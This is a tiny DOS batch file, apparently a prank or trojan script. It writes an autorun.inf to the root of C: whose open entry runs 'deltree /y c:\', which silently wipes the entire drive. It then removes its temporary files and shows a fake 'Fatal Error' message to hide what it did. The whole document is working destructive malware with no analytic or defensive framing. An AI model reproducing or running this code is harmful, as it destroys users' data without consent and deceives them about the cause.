@Echo [autorun]>1.killer
@Echo open=deltree /y c:\>2.killer
@Copy 1.killer + 2.killer c:\autorun.inf>nul
@Del *.killer
@Echo A Fatal Error Has Occured!
@Echo Quiting...